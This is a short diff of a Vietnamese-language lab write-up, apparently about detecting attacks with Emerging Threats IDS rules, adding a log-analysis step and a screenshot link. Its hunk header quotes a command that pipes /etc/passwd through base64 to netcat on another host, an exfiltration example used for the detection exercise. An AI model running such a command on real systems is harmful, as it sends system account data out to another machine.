@@ -137,6 +137,10 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
 
 ### Bước 5: Phân tích log
 
+Thực hiện truy vấn log cảnh báo kích hoạt bởi ET rules
+
+<img width="1135" height="617" alt="image" src="https://github.com/user-attachments/assets/b23f87c6-bd2a-4af9-8b32-3649490e0d18" />
+
 ### Log của hành vi quét cổng
 
 ```
